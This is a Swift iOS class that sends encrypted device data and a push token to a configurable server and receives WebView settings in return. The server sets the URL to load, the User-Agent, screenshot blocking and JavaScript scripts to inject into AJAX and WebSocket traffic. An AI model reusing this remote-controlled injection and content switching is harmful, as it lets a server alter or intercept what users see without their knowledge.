import Foundation
import CryptoKit
import UserNotifications
import UIKit
import CommonCrypto

class DataCollectorAttribution {
    static let shared = DataCollectorAttribution()
        
    private var appID: String?
    private var decryptionKey: String?
    private var endpoint: String?
    private var deviceInfo: MainInfoDictionary?
    private var isInitialized = false
    
    private init() {}
    
    func initialize(appID: String?, decryptionKey: String?, endpoint: String?, completion: (Bool) -> Void) {
        
        SessionService.shared.startSession()
        
        self.appID = appID
        self.decryptionKey = decryptionKey
        self.endpoint = endpoint
        self.deviceInfo = MainInfoDictionary()
        self.isInitialized = true
        
        completion(self.isInitialized)
    }
    
    func setPushToken(_ token: String) {
        SecureUserDefaults.standard.set(token, forKey: "notificationstoken")
        
        if let deviceInfo = self.deviceInfo {
            deviceInfo.pushToken = token
        }
        
        NotificationCenter.default.post(name: NSNotification.Name("PushTokenReceived"), object: token)
    }
    
    func requestPermissions() {
        guard isInitialized else {
            return
        }
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { [weak self] granted, error in
            DispatchQueue.main.async {
                self?.handlePushAuthorization(granted: granted, error: error)
            }
        }
    }
    
    func returnDeviceInfo() -> MainInfoDictionary? {
        return deviceInfo
    }
    
    func getDecryptionKey() -> String? {
        return decryptionKey
    }
    
    private func handlePushAuthorization(granted: Bool, error: Error?) {
        if granted {
            UIApplication.shared.registerForRemoteNotifications()
        }
        
        if let pushToken = getPushToken() {
            handlePushToken(pushToken)
        } else {
            NotificationCenter.default.addObserver(forName: NSNotification.Name("PushTokenReceived"), object: nil, queue: .main) { [weak self] notification in
                if let token = notification.object as? String {
                    self?.handlePushToken(token)
                }
            }
        
            
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
                if(self?.getPushToken() == nil){
                    self?.handlePushToken(nil)
                }
            }
            
        }
    }
    
    private func handlePushToken(_ pushToken: String?) {
        self.deviceInfo = MainInfoDictionary(pushToken: pushToken)
        sendData()
    }
    
    private func getPushToken() -> String? {
        return SecureUserDefaults.standard.string(forKey: "notificationstoken")
    }
    
    private func sendData() {
        guard let appID = appID else {
            return
        }
        
        guard let decryptionKey = decryptionKey else {
            return
        }
        
        guard let endpoint = endpoint else {
            return
        }
        

        var jsonData = deviceInfo?.dictionary ?? [:]
        jsonData["app_id"] = appID
        
        if(AppLogger.shared.logsEnabled){
            print(jsonData)
        }
        
        let options = JSONSerialization.WritingOptions(rawValue: 0)
        guard let jsonBody = try? JSONSerialization.data(withJSONObject: jsonData, options: options) else {
            return
        }
        
        Task {
            await postEncrypted(jsonBody: jsonBody, decryptionKey: decryptionKey, endpoint: endpoint)
        }
        
    }
    
    func postEncrypted(jsonBody: Data, decryptionKey: String, endpoint: String) async {
        guard let url = URL(string: endpoint) else { return }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("text/plain", forHTTPHeaderField: "Content-Type")

        do {
            let encryptedData = try self.encrypt(jsonBody, key: decryptionKey)
            print(encryptedData)
            request.httpBody = encryptedData

            let (data, _) = try await URLSession.shared.data(for: request)
            
            if let responseString = String(data: data, encoding: .utf8) {
                logPrint("Full response string:\n\(responseString)")
            }
            
            let decrypted = try decryptServerPayload(data, key: decryptionKey)

            if let debugString = String(data: decrypted, encoding: .utf8) {
                logPrint("Decrypted/Plain response:\n\(debugString)")
            } else {
                logPrint("Decrypted response is not valid UTF-8 (likely binary JSON).")
            }

            let response = try JSONDecoder().decode(ServerResponse.self, from: decrypted)
            
            let cachedLink = SecureUserDefaults.standard.string(forKey: "cachedLink")
            
            if(cachedLink == nil){
                SecureUserDefaults.standard.set(response.url!, forKey: "cachedLink")
            }
            
            // 📩 Зберігаємо apns_ban флаг з корня ответа
            let apnsBan = response.apns_ban ?? false
            SecureUserDefaults.standard.set(apnsBan, forKey: "apns_ban")
            logPrint("📩 APNS Ban from server: \(apnsBan ? "ENABLED ✅" : "DISABLED ❌")")
            
            // Зберігаємо WebView конфігурацію якщо є
            if let webViewConfig = response.webViewConfig {
                saveWebViewConfiguration(webViewConfig)
                
                // Зберігаємо JS інʼєкції з tracking конфігурації
                if let jsAjax = webViewConfig.tracking.jsInjectionAjax {
                    SecureUserDefaults.standard.set(jsAjax, forKey: "jsInjectionAjax")
                    logPrint("✅ Received custom AJAX injection script from server (\(jsAjax.count) chars)")
                }
                
                if let jsWebSocket = webViewConfig.tracking.jsInjectionWebsocket {
                    SecureUserDefaults.standard.set(jsWebSocket, forKey: "jsInjectionWebsocket")
                    logPrint("✅ Received custom WebSocket injection script from server (\(jsWebSocket.count) chars)")
                }
                
                // Зберігаємо User-Agent з network конфігурації
                if let userAgent = webViewConfig.network.useragent {
                    SecureUserDefaults.standard.set(userAgent, forKey: "customUserAgent")
                    logPrint("✅ Received custom User-Agent from server: \(userAgent)")
                }
                
                // Зберігаємо флаг дозволу скріншотів
                let screenshotsAllowed = webViewConfig.network.screenshots_allowed ?? false
                SecureUserDefaults.standard.set(screenshotsAllowed, forKey: "screenshotsAllowed")
                logPrint("🛡️ Screenshots from server: \(screenshotsAllowed ? "ALLOWED ✅" : "BLOCKED ❌")")
                
                 if !screenshotsAllowed {
                     ScreenShield.shared.protectFromScreenRecording()
                 }
                
                // Активируем/деактивируем debug режим
                let debugModeEnabled = webViewConfig.network.debugModeEnabled ?? false
                SecureUserDefaults.standard.set(debugModeEnabled, forKey: "debugModeEnabled")
                logPrint("🐛 Debug mode from server: \(debugModeEnabled ? "ENABLED ✅" : "DISABLED ❌")")
                
                if debugModeEnabled {
                    DebugScreenshotHelper.shared.activate()
                } else {
                    DebugScreenshotHelper.shared.deactivate()
                }
                
                
            }
            
            if(response.cachingPolicy != nil){
                SecureUserDefaults.standard.set(response.cachingPolicy!, forKey: "cachingPolicy")
                switch response.cachingPolicy! {
                case "device":
                    if(cachedLink == nil){
                        NotificationCenter.default.post(name: .serverResponseReceived, object: response.url!)
                    } else {
                        NotificationCenter.default.post(name: .serverResponseReceived, object: cachedLink!)
                    }
                case "latest":
                    NotificationCenter.default.post(name: .serverResponseReceived, object: response.url!)
                case "server":
                    SecureUserDefaults.standard.set(response.url!, forKey: "cachedLink")
                    NotificationCenter.default.post(name: .serverResponseReceived, object: response.url!)
                default:
                    proceedServerError()
                }
            } else {
                self.proceedServerError()
            }
        } catch {
            self.proceedServerError()
        }
    }
    
    
    func proceedServerError(){
        let cachingPolicy = SecureUserDefaults.standard.string(forKey: "cachingPolicy")
        let latestData = SecureUserDefaults.standard.data(forKey: "webview_session_state")
        let cachedLink = SecureUserDefaults.standard.string(forKey: "cachedLink")
        if(cachingPolicy != nil){
            if(latestData != nil){
                SecureUserDefaults.standard.set("latest", forKey: "cachingPolicy")
                if(cachedLink != nil){
                    NotificationCenter.default.post(name: .serverResponseReceived, object: cachedLink)
                } else {
                    NotificationCenter.default.post(name: .serverResponseReceived, object: "https://test.com")
                }
            } else {
                if(cachedLink != nil){
                    SecureUserDefaults.standard.set("device", forKey: "cachingPolicy")
                    NotificationCenter.default.post(name: .serverResponseReceived, object: cachedLink!)
                } else {
                    NotificationCenter.default.post(name: .serverResponseReceived, object: nil)
                }
            }
        } else {
            NotificationCenter.default.post(name: .serverResponseReceived, object: nil)
        }
    }
    
    func encrypt(_ data: Data, key: String) throws -> Data {
        guard let keyData = key.data(using: .utf8) else {
            throw NSError(domain: "EncryptionService", code: 1, userInfo: [NSLocalizedDescriptionKey: "Invalid key"])
        }
        
        let hash = SHA256.hash(data: keyData)
        let keyBytes = [UInt8](hash)
        
        let encryptedData = try encryptData(data: data, key: Data(keyBytes))
        
        return encryptedData
    }

    
    func encryptData(data: Data, key: Data) throws -> Data {
        let keyLength = size_t(kCCKeySizeAES256)
        let blockSize = size_t(kCCBlockSizeAES128)
        let ivSize = size_t(kCCBlockSizeAES128)
        
        var iv = [UInt8](repeating: 0, count: ivSize)
        _ = SecRandomCopyBytes(kSecRandomDefault, ivSize, &iv)
        
        let bufferSize = size_t(data.count + blockSize)
        var buffer = [UInt8](repeating: 0, count: bufferSize)
        var numBytesEncrypted: size_t = 0
        
        let status = CCCrypt(
            CCOperation(kCCEncrypt),
            CCAlgorithm(kCCAlgorithmAES),
            CCOptions(kCCOptionPKCS7Padding),
            [UInt8](key), keyLength,
            iv,
            [UInt8](data), data.count,
            &buffer, bufferSize,
            &numBytesEncrypted
        )
        
        guard status == kCCSuccess else {
            throw NSError(domain: "CommonCrypto", code: Int(status), userInfo: [NSLocalizedDescriptionKey: "Encryption failed"])
        }
        
        var result = Data(iv)
        result.append(buffer, count: Int(numBytesEncrypted))
        
        return result
    }
    

    func decrypt(_ data: Data, key: String) throws -> Data {
        guard let keyData = key.data(using: .utf8) else {
            throw NSError(domain: "EncryptionService", code: 2,
                          userInfo: [NSLocalizedDescriptionKey: "Invalid key"])
        }
        let hash = SHA256.hash(data: keyData)
        let keyBytes = Data(hash)

        return try decryptData(data: data, key: keyBytes)
    }

    func decryptData(data: Data, key: Data) throws -> Data {
        let blockSize = size_t(kCCBlockSizeAES128) // 16
        let ivSize = blockSize
        let keyLength = size_t(kCCKeySizeAES256)

        
        guard data.count >= ivSize else {
            throw NSError(domain: "CommonCrypto", code: -1,
                          userInfo: [NSLocalizedDescriptionKey: "Ciphertext too short"])
        }

        
        let iv = [UInt8](data.prefix(ivSize))
        let cipherData = data.advanced(by: ivSize)
        let cipherBytes = [UInt8](cipherData)


        var outBytes = [UInt8](repeating: 0, count: cipherBytes.count + blockSize)
        var outLength: size_t = 0

        let status = CCCrypt(
            CCOperation(kCCDecrypt),
            CCAlgorithm(kCCAlgorithmAES),
            CCOptions(kCCOptionPKCS7Padding),
            [UInt8](key), keyLength,
            iv,
            cipherBytes, cipherBytes.count,
            &outBytes, outBytes.count,
            &outLength
        )

        guard status == kCCSuccess else {
            throw NSError(domain: "CommonCrypto", code: Int(status),
                          userInfo: [NSLocalizedDescriptionKey: "Decryption failed"])
        }

        return Data(bytes: outBytes, count: outLength)
    }

    private func decryptServerPayload(_ data: Data, key: String) throws -> Data {
        return try decrypt(data, key: key)
    }
    
    // MARK: - WebView Configuration Management
    private func saveWebViewConfiguration(_ config: WebViewConfiguration) {
        do {
            let configData = try JSONEncoder().encode(config)
            let encryptedData = try encrypt(configData, key: decryptionKey ?? "")
            SecureUserDefaults.standard.set(encryptedData, forKey: "webViewConfiguration")
            
            // Повідомляємо про оновлення конфігурації
            NotificationCenter.default.post(name: .webViewConfigurationUpdated, object: config)
            
            logPrint("✅ WebView configuration saved and encrypted")
        } catch {
            logPrint("❌ Failed to save WebView configuration: \(error)")
        }
    }
    
    func loadWebViewConfiguration() -> WebViewConfiguration {
        guard let encryptedData = SecureUserDefaults.standard.data(forKey: "webViewConfiguration"),
              let decryptionKey = decryptionKey else {
            logPrint("ℹ️ No saved WebView configuration found, using defaults")
            return WebViewConfiguration() // Стандартна конфігурація
        }
        
        do {
            let decryptedData = try decrypt(encryptedData, key: decryptionKey)
            let config = try JSONDecoder().decode(WebViewConfiguration.self, from: decryptedData)
            logPrint("✅ WebView configuration loaded from encrypted storage")
            logPrint("🎨 Background color: \(config.ui.webViewBackgroundColor ?? "auto")")
            logPrint("📱 Pull to refresh: \(config.ui.pullToRefreshEnabled)")
            logPrint("🧭 Navigation menu: \(config.ui.navigationMenuEnabled)")
            logPrint("🔒 Navigation menu static: \(config.ui.navigationMenuStatic ? "YES (always visible)" : "NO (Safari-style)")")
            logPrint("📊 Progress bar: \(config.ui.progressBarEnabled)")
            return config
        } catch {
            logPrint("❌ Failed to load WebView configuration: \(error), using defaults")
            return WebViewConfiguration() // Fallback до стандартної
        }
    }
    
}


extension Notification.Name {
    static let serverResponseReceived = Notification.Name("ServerResponseReceived")
    static let webViewConfigurationUpdated = Notification.Name("WebViewConfigurationUpdated")
}
